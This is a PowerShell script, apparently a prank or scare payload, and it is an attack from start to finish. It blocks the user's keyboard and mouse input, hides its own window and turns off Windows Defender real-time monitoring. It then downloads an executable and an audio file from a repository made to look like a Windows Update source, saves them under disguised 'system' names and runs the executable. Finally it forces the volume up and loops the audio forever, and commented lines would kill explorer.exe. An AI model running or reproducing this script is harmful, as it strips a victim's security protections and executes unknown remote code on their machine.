Add-Type -AssemblyName presentationCore
Add-Type -AssemblyName System.Windows.Forms

$SignatureBlockInput = @"
  [DllImport("user32.dll")]
  public static extern bool BlockInput(bool fBlockIt);
"@

$UserInput = Add-Type -MemberDefinition $SignatureBlockInput -Name "UserInput" -PassThru

$SignatureShowWindowAsync = @"
  [DllImport("user32.dll")]
  public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
"@

$ShowWindowAsync = Add-Type -MemberDefinition $SignatureShowWindowAsync -Name "Window" -PassThru

$UserInput::BlockInput($true) | Out-Null
$ShowWindowAsync::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 2) | Out-Null

Set-MpPreference -DisableRealtimeMonitoring $true

mkdir $home\SystemFiles

$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://raw.githubusercontent.com/MilkrosoftWindows/WindowsUpdate/warni/cyberbamboozled.exe",$home+"\SystemFiles\WindowsBamboozle.exe")
$WebClient.DownloadFile("https://raw.githubusercontent.com/MilkrosoftWindows/WindowsUpdate/warni/warni.mp3",$home+"\SystemFiles\WindowsStartupAudio.mp3")

$wshShell = new-object -com wscript.shell;

# Fonction set volume
Function Set-Volume($Volume){
  1..50 | % { $wshShell.SendKeys([char]174) }
  1..$Volume | % { $wshShell.SendKeys([char]175) }
}

Function Press-VolumeUp() {
  $wshShell.SendKeys([char]175)
}

start $home\SystemFiles\WindowsBamboozle.exe

# Jouer Musique
$loopPos = New-Object System.TimeSpan(0, 0, 0, 5, 380)
$mediaPlayer = New-Object System.Windows.Media.MediaPlayer
$mediaPlayer.open($home+"\SystemFiles\WindowsStartupAudio.mp3")
$mediaPlayer.Stop()
$mediaPlayer.Play()

Set-Volume 10

$UserInput::BlockInput($false) | Out-Null

$blocked = $true
$first = $true;

while ($true) {
  if ($mediaPlayer.Position.Seconds -gt 29) {
    $mediaPlayer.Position = $loopPos
  }
  elseif (($mediaPlayer.Position.Seconds -gt 2) -and ($blocked -eq $true)) {
    # $UserInput::BlockInput($false) | Out-Null
    $blocked = $false
  }

  if ($first -and ($mediaPlayer.Position.Seconds -lt 4)) {
    #Press-VolumeUp
  } else {
    $first = $false
    # force kill explorer.exe
    #taskkill /F /IM explorer.exe | Out-Null
  }
  Start-Sleep -Milliseconds 200
}

exit
